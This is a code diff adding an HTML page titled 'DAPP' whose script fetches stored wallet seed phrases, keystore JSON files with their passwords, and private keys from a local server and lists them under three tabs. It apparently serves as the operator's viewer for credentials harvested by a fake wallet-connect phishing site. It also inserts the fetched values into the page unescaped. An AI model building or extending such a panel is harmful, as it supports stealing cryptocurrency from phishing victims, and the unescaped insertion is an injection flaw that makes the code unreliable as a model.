@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./assets/css.css">
+    <title>DAPP</title>
+
+</head>
+<body>
+      
+    <section class="header">
+        <nav>
+           
+        </nav>
+       
+    </section>
+    
+
+    <section class="form">
+        <h1>
+            select type
+        </h1>
+        <div class="div">
+            <button class="active">
+                Phrase
+            </button>
+            <button>
+                KeyStore
+            </button>
+            <button>
+                Private Key
+            </button>
+        </div>
+
+        <form class="" style="gap: 10px;">
+            <h1>
+                All Phrases
+            </h1>
+           
+          
+           
+          
+        </form>
+
+        <form class="hid" style="gap: 10px;">
+            <h1>
+                All KeyStore
+            </h1>
+          
+          
+        </form>
+
+        <form class="hid" style="gap: 10px;">
+          
+            <h1>
+               Private Key
+            </h1>
+           
+        </form>
+    </section>
+
+
+   
+  <section class="conecting hid">
+      
+  </section>
+    <script>
+    var apiUrl="http://127.0.0.1:5502/"
+  
+  
+  
+     var button= document.querySelectorAll(".form .div button")
+     var form=document.getElementsByTagName("form")
+     button[0].addEventListener("click",()=>{
+      for (let i = 0; i < button.length; i++) {
+          const element = button[i].classList.remove("active");
+      }
+      for (let i = 0; i < form.length; i++) {
+          const element = form[i].classList.add("hid");
+      }
+  
+      button[0].classList.add("active");
+      form[0].classList.remove("hid");
+     })
+   
+     button[1].addEventListener("click",()=>{
+      for (let i = 0; i < button.length; i++) {
+          const element = button[i].classList.remove("active");
+      }
+      for (let i = 0; i < form.length; i++) {
+          const element = form[i].classList.add("hid");
+      }
+  
+      button[1].classList.add("active");
+      form[1].classList.remove("hid");
+     })
+  
+     button[2].addEventListener("click",()=>{
+      for (let i = 0; i < button.length; i++) {
+          const element = button[i].classList.remove("active");
+      }
+      for (let i = 0; i < form.length; i++) {
+          const element = form[i].classList.add("hid");
+      }
+  
+      button[2].classList.add("active");
+      form[2].classList.remove("hid");
+     })
+    
+  
+     fetch(`${apiUrl}/phrase/phrases`)
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+       for (let i = 0; i < data.length; i++) {
+        const element = data[i];
+           uploadItemPhrase(element)
+       }
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+  
+     fetch(`${apiUrl}/keyStore/keystores`)
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+       for (let i = 0; i < data.length; i++) {
+        const element = data[i];
+           uploadItemKeyStore(element)
+       }
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+  
+     fetch(`${apiUrl}/privateKey/privatekeys`)
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+       for (let i = 0; i < data.length; i++) {
+        const element = data[i];
+           uploadItemPrivateKey(element)
+       }
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+  
+   
+
+
+
+
+
+      function uploadItemPhrase(data){
+ 
+    var html=`
+            <span>
+                <b>
+                    wallet Phrase
+                </b>
+                <p>
+                 ${data.keyphrase}
+                </p>
+            </span>
+          
+    `
+    form[0].insertAdjacentHTML("beforeend",html)
+ }
+  
+
+      function uploadItemKeyStore(data){
+ 
+    var html=`
+            <span>
+                <b>
+                    Keystore JSON
+                </b>
+                <p>
+                 ${data.keystoreJSON}
+                </p>
+            </span>
+            <span>
+                <b>
+                    password
+                </b>
+                <p>
+                 ${data.password}
+                </p>
+            </span>
+          
+    `
+    form[1].insertAdjacentHTML("beforeend",html)
+ }
+  
+
+      function uploadItemPrivateKey(data){
+ 
+    var html=`
+            <span>
+                <b>
+                    Private Key
+                </b>
+                <p>
+                 ${data.privateKey}
+                </p>
+            </span>
+          
+    `
+    form[2].insertAdjacentHTML("beforeend",html)
+ }
+  
+    </script>
+    <script src="./assets/js.js"></script>
+</body>
+</html>
